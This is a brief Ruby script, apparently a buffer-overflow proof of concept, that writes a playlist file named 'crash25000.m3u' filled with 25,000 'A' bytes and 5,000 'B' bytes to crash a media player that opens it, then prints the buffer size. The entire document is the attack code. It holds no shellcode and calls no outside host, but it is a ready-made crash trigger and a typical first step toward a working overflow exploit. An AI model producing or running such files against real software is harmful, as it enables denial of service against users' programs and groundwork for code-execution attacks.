#!/usr/bin/env ruby

file = "crash25000.m3u"
junk = "\x41" * 25000
junk2 = "\x42" * 5000
verify = junk + junk2

File.open(file, 'w') {|f| f.write(verify)}

puts "[*] Buffer create with size: #{verify.size}"